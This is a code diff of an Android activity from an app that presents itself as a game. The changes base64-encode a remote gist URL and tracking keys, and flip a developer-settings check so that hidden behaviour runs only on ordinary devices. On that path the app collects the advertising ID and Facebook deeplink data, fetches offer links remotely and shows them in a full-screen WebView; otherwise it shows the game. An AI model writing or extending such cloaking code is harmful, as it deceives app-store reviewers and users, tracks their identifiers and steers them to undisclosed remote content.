@@ -10,7 +10,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
-import android.preference.PreferenceActivity;
 import android.preference.PreferenceManager;
 import android.provider.MediaStore;
 import android.provider.Settings;
@@ -36,20 +35,17 @@ import androidx.appcompat.app.AppCompatActivity;
 
 import com.appsflyer.AppsFlyerLib;
 import com.facebook.FacebookSdk;
-import com.facebook.appevents.AppEventsLogger;
 import com.facebook.applinks.AppLinkData;
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 
-import com.nneo.srta.R;
-
 public class NS extends AppCompatActivity {
-    public WebView webView;
-    public static final String ONESIGNAL_APP_ID_NNEO_SRTA = "1cfba450-7624-48e4-a8bd-3867dc9a22d9";
-    private static final String URL_DEF_NNEO_SRTA = "https://gist.githubusercontent.com/RKDev11/a10f2f57ebbdaa4d25860f3ec3f2e969/raw/Neon%2520Star";
+    public WebView webViewNnneoSrta;
+    public static final String ONESIGNAL_APP_ID_NNEO_SRTA = "MWNmYmE0NTAtNzYyNC00OGU0LWE4YmQtMzg2N2RjOWEyMmQ5";
+    private static final String URL_DEF_NNEO_SRTA = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SS0RldjExL2ExMGYyZjU3ZWJiZGFhNGQyNTg2MGYzZWMzZjJlOTY5L3Jhdy9OZW9uJTI1MjBTdGFy";
     public static final int FILECHOOSER_RESULTCODE_NNEO_SRTA = 1;
-    public static final String AF_DEV_KEY_NNEO_SRTA = "YE7uZncJCchMFrVvAbrnJR";
-    public static final String LOG = "MyLog";
-    public String linkTrue;
+    public static final String AF_DEV_KEY_NNEO_SRTA = "WUU3dVpuY0pDY2hNRnJWdkFicm5KUg==";
+    public static final String LOG_NNEO_SRTA = "MyLog";
+    public String linkTrueNnneoSrta;
     public static String BUF_READ_NNEO_SRTA;
     public String[] lineNnneoSrta;
     public ValueCallback<Uri[]> mFilePathCallbackNnneoSrta;
@@ -60,14 +56,14 @@ public class NS extends AppCompatActivity {
     public static String apps_idNnneoSrta;
     public String paramsNnneoSrta;
     public String dataFbNnneoSrta;
-    public String packageNameNnneoSrta = "com.nneo.srta";
+    public String packageNameNnneoSrta = "Y29tLm5uZW8uc3J0YQ==";
     String savedLinkNnneoSrta;
     SharedPreferences spNnneoSrta;
     public String keyLinkNnneoSrta;
     public String linkOfferNnneoSrta;
     public String fbIdNnneoSrta;
     public static String fbDataNnneoSrta;
-    public static Intent intent;
+    public static Intent intentNnneoSrta;
 
 
 
@@ -76,29 +72,29 @@ public class NS extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        intent = new Intent(NS.this, GameActivity.class);
-        webView = findViewById(R.id.webView);
-        int adb = Settings.Secure.getInt(this.getContentResolver(),
+        getWindow().addFlags(1024);
+        intentNnneoSrta = new Intent(NS.this, GameActivity.class);
+        webViewNnneoSrta = findViewById(R.id.webView);
+        int adbNnneoSrta = Settings.Secure.getInt(this.getContentResolver(),
                 Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
-        WebClass webClass = new WebClass();
-        ParsLine parsLine = new ParsLine();
+        WebClass webClassNnneoSrta = new WebClass();
+        ParsLine parsLineNnneoSrta = new ParsLine();
 
-        webClass.oneSignal(this);
+        webClassNnneoSrta.oneSignal(this);
 
-        AppsFlyerLib.getInstance().init(AF_DEV_KEY_NNEO_SRTA, webClass.conversionListener, NS.this);
+        AppsFlyerLib.getInstance().init(Decoder11(AF_DEV_KEY_NNEO_SRTA), webClassNnneoSrta.conversionListenerNnneoSrta, NS.this);
         AppsFlyerLib.getInstance().start(NS.this);
         apps_idNnneoSrta = AppsFlyerLib.getInstance().getAppsFlyerUID(NS.this);
 
-        if (adb != 0) {
+        if (adbNnneoSrta == 0) {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
                     try {
                         adIdNnneoSrta = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
-                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(URL_DEF_NNEO_SRTA).openConnection();
-                        Log.i(LOG, "non: " + adIdNnneoSrta);
-                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
-                        BUF_READ_NNEO_SRTA = bufferedReader.readLine();
+                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(Decoder11(URL_DEF_NNEO_SRTA)).openConnection();
+                        BufferedReader bufferedReaderNnneoSrta = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
+                        BUF_READ_NNEO_SRTA = bufferedReaderNnneoSrta.readLine();
 
                         lineNnneoSrta = BUF_READ_NNEO_SRTA.split("\\u007c");
 
@@ -117,7 +113,6 @@ public class NS extends AppCompatActivity {
                             @Override
                             public void run() {
                                 FacebookSdk.setApplicationId(fbIdNnneoSrta);
-                                Log.i(LOG, "non: " + fbIdNnneoSrta);
                                 FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                 FacebookSdk.fullyInitialize();
                                 FacebookSdk.setAutoInitEnabled(true);
@@ -125,15 +120,16 @@ public class NS extends AppCompatActivity {
                                 AppLinkData.fetchDeferredAppLinkData(NS.this,
                                         new AppLinkData.CompletionHandler() {
                                             @Override
-                                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
-                                                if (appLinkData == null) {
-                                                    appLinkData = AppLinkData.createFromActivity(NS.this);
-                                                    Log.i(LOG, "non: " + appLinkData);
+                                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkDataNnneoSrta) {
+                                                if (appLinkDataNnneoSrta == null) {
+                                                    appLinkDataNnneoSrta = AppLinkData.createFromActivity(NS.this);
+                                                    Log.i(LOG_NNEO_SRTA, "fbDATA: " + appLinkDataNnneoSrta);
                                                 }
-                                                if (appLinkData != null) {
-                                                    Uri url = appLinkData.getTargetUri();
+                                                if (appLinkDataNnneoSrta != null) {
+                                                    Uri url = appLinkDataNnneoSrta.getTargetUri();
                                                     dataFbNnneoSrta = url.getQuery();
-                                                    fbDataNnneoSrta = parsLine.ChangeLine(dataFbNnneoSrta);
+                                                    Log.i(LOG_NNEO_SRTA, "fbDATAFB: " + dataFbNnneoSrta);
+                                                    fbDataNnneoSrta = parsLineNnneoSrta.ChangeLine(dataFbNnneoSrta);
                                                 } else {
 
                                                 }
@@ -141,23 +137,26 @@ public class NS extends AppCompatActivity {
                                         }
 
                                 );
-                                new Handler().postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        if (savedLinkNnneoSrta != null) {
-                                            webClass.getWeb(webView, savedLinkNnneoSrta);
-                                        } else {
-                                            webClass.StartWebView(linkOfferNnneoSrta, keyLinkNnneoSrta, webView, fbDataNnneoSrta, NS.this);
+
+                                if (savedLinkNnneoSrta != null) {
+                                    webClassNnneoSrta.getWeb(webViewNnneoSrta, savedLinkNnneoSrta);
+                                } else {
+                                    new Handler().postDelayed(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            Log.i(LOG_NNEO_SRTA, "keyLinkNS: " + keyLinkNnneoSrta);
+                                            webClassNnneoSrta.StartWebView(linkOfferNnneoSrta, keyLinkNnneoSrta, webViewNnneoSrta, fbDataNnneoSrta, NS.this);
                                         }
-                                    }
-                                }, 5000);
-                                webView.setWebViewClient(new WebViewClient() {
+                                    },7000);
+                                }
+
+                                webViewNnneoSrta.setWebViewClient(new WebViewClient() {
                                     @Override
                                     public void onPageStarted(WebView view, String url, Bitmap favicon) {
                                         super.onPageStarted(view, url, favicon);
-                                        if (url.startsWith(Decoder11("NDA0"))) {
-                                            Intent intent = new Intent(NS.this, GameActivity.class);
-                                            startActivity(intent);
+                                        if (url.contains(Decoder11("NDA0"))) {
+                                            Intent intentNnneoSrta = new Intent(NS.this, GameActivity.class);
+                                            startActivity(intentNnneoSrta);
                                         }
                                     }
 
@@ -165,13 +164,13 @@ public class NS extends AppCompatActivity {
                                     public void onPageFinished(WebView view, String url) {
                                         super.onPageFinished(view, url);
                                         SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(view.getContext());
-                                        SharedPreferences.Editor editor = sp.edit();
-                                        editor.putString(Decoder11("NDA0"), url);
-                                        editor.apply();
+                                        SharedPreferences.Editor editorNnneoSrta = sp.edit();
+                                        editorNnneoSrta.putString(Decoder11("a2V5X3VybA=="), url);
+                                        editorNnneoSrta.apply();
                                     }
 
                                 });
-                                webView.setWebChromeClient(new WebChromeClient() {
+                                webViewNnneoSrta.setWebChromeClient(new WebChromeClient() {
 
                                     public boolean onShowFileChooser(
                                             WebView webView, ValueCallback<Uri[]> filePathCallback,
@@ -181,83 +180,83 @@ public class NS extends AppCompatActivity {
                                         }
                                         mFilePathCallbackNnneoSrta = filePathCallback;
 
-                                        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-                                        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
+                                        Intent takePictureIntentNnneoSrta = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+                                        if (takePictureIntentNnneoSrta.resolveActivity(getPackageManager()) != null) {
 
-                                            File photoFile = null;
+                                            File photoFileNnneoSrta = null;
                                             try {
-                                                photoFile = createImageFile();
-                                                takePictureIntent.putExtra(Decoder11("UGhvdG9QYXRo"), mCameraPhotoPathNnneoSrta);
+                                                photoFileNnneoSrta = createImageFile();
+                                                takePictureIntentNnneoSrta.putExtra(Decoder11("UGhvdG9QYXRo"), mCameraPhotoPathNnneoSrta);
                                             } catch (IOException ex) {
                                             }
 
-                                            if (photoFile != null) {
-                                                mCameraPhotoPathNnneoSrta = Decoder11("ZmlsZTo=") + photoFile.getAbsolutePath();
-                                                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
-                                                        Uri.fromFile(photoFile));
+                                            if (photoFileNnneoSrta != null) {
+                                                mCameraPhotoPathNnneoSrta = Decoder11("ZmlsZTo=") + photoFileNnneoSrta.getAbsolutePath();
+                                                takePictureIntentNnneoSrta.putExtra(MediaStore.EXTRA_OUTPUT,
+                                                        Uri.fromFile(photoFileNnneoSrta));
                                             } else {
-                                                takePictureIntent = null;
+                                                takePictureIntentNnneoSrta = null;
                                             }
                                         }
-                                        Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
-                                        contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
-                                        contentSelectionIntent.setType(Decoder11("aW1hZ2UvKg=="));
+                                        Intent contentSelectionIntentNnneoSrta = new Intent(Intent.ACTION_GET_CONTENT);
+                                        contentSelectionIntentNnneoSrta.addCategory(Intent.CATEGORY_OPENABLE);
+                                        contentSelectionIntentNnneoSrta.setType(Decoder11("aW1hZ2UvKg=="));
 
-                                        Intent[] intentArray;
-                                        if (takePictureIntent != null) {
-                                            intentArray = new Intent[]{takePictureIntent};
+                                        Intent[] intentArrayNnneoSrta;
+                                        if (takePictureIntentNnneoSrta != null) {
+                                            intentArrayNnneoSrta = new Intent[]{takePictureIntentNnneoSrta};
                                         } else {
-                                            intentArray = new Intent[0];
+                                            intentArrayNnneoSrta = new Intent[0];
                                         }
-                                        Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
-                                        chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
-                                        chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
-                                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
-                                        startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE_NNEO_SRTA);
+                                        Intent chooserIntentNnneoSrta = new Intent(Intent.ACTION_CHOOSER);
+                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_INTENT, contentSelectionIntentNnneoSrta);
+                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
+                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArrayNnneoSrta);
+                                        startActivityForResult(chooserIntentNnneoSrta, FILECHOOSER_RESULTCODE_NNEO_SRTA);
                                         return true;
                                     }
 
                                     // creating image files (Lollipop only)
                                     private File createImageFile() throws IOException {
 
-                                        File imageStorageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), Decoder11("RGlyZWN0b3J5TmFtZUhlcmU="));
+                                        File imageStorageDirNnneoSrta = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), Decoder11("RGlyZWN0b3J5TmFtZUhlcmU="));
 
-                                        if (!imageStorageDir.exists()) {
-                                            imageStorageDir.mkdirs();
+                                        if (!imageStorageDirNnneoSrta.exists()) {
+                                            imageStorageDirNnneoSrta.mkdirs();
                                         }
                                         // create an image file name
-                                        imageStorageDir = new File(imageStorageDir + File.separator + Decoder11("SU1HXw==") + String.valueOf(System.currentTimeMillis()) + Decoder11("LmpwZw=="));
-                                        return imageStorageDir;
+                                        imageStorageDirNnneoSrta = new File(imageStorageDirNnneoSrta + File.separator + Decoder11("SU1HXw==") + String.valueOf(System.currentTimeMillis()) + Decoder11("LmpwZw=="));
+                                        return imageStorageDirNnneoSrta;
                                     }
                                 });
                             }
                         });
                     } catch (Exception e) {
 
-                        startActivity(intent);
+                        startActivity(intentNnneoSrta);
                     }
                 }
             }).start();
         } else {
-            startActivity(intent);
+            startActivity(intentNnneoSrta);
         }
     }
 
 
     @Override
-    public void onActivityResult(int requestCode, int resultCode, Intent data) {
+    public void onActivityResult(int requestCodeNnneoSrta, int resultCodeNnneoSrta, Intent dataNnneoSrta) {
 
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
-            if (requestCode == FILECHOOSER_RESULTCODE_NNEO_SRTA) {
+            if (requestCodeNnneoSrta == FILECHOOSER_RESULTCODE_NNEO_SRTA) {
                 if (null == this.mUploadMessageNnneoSrta) {
                     return;
                 }
                 Uri result = null;
                 try {
-                    if (resultCode != RESULT_OK) {
+                    if (resultCodeNnneoSrta != RESULT_OK) {
                         result = null;
                     } else {
-                        result = data == null ? mCapturedImageURINnneoSrta : data.getData();
+                        result = dataNnneoSrta == null ? mCapturedImageURINnneoSrta : dataNnneoSrta.getData();
                     }
                 } catch (Exception e) {
                     Toast.makeText(getApplicationContext(), Decoder11("YWN0aXZpdHkgOg==") + e, Toast.LENGTH_LONG).show();
@@ -267,18 +266,18 @@ public class NS extends AppCompatActivity {
             }
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            if (requestCode != FILECHOOSER_RESULTCODE_NNEO_SRTA || mFilePathCallbackNnneoSrta == null) {
-                super.onActivityResult(requestCode, resultCode, data);
+            if (requestCodeNnneoSrta != FILECHOOSER_RESULTCODE_NNEO_SRTA || mFilePathCallbackNnneoSrta == null) {
+                super.onActivityResult(requestCodeNnneoSrta, resultCodeNnneoSrta, dataNnneoSrta);
                 return;
             }
             Uri[] results = null;
-            if (resultCode == Activity.RESULT_OK) {
-                if (data == null || data.getData() == null) {
+            if (resultCodeNnneoSrta == Activity.RESULT_OK) {
+                if (dataNnneoSrta == null || dataNnneoSrta.getData() == null) {
                     if (mCameraPhotoPathNnneoSrta != null) {
                         results = new Uri[]{Uri.parse(mCameraPhotoPathNnneoSrta)};
                     }
                 } else {
-                    String dataString = data.getDataString();
+                    String dataString = dataNnneoSrta.getDataString();
                     if (dataString != null) {
                         results = new Uri[]{Uri.parse(dataString)};
                     }
@@ -289,15 +288,15 @@ public class NS extends AppCompatActivity {
         }
     }
 
-    public String Decoder11(String decod) {
-        String decodedString11 = new String(Base64.decode(decod, Base64.DEFAULT));
-        return decodedString11;
+    public String Decoder11(String decodNnneoSrta) {
+        String decodedString11NnneoSrta = new String(Base64.decode(decodNnneoSrta, Base64.DEFAULT));
+        return decodedString11NnneoSrta;
     }
 
     @Override
     public void onBackPressed() {
-        if (webView.isFocused() && webView.canGoBack()) {
-            webView.goBack();
+        if (webViewNnneoSrta.isFocused() && webViewNnneoSrta.canGoBack()) {
+            webViewNnneoSrta.goBack();
         }
     }
 }
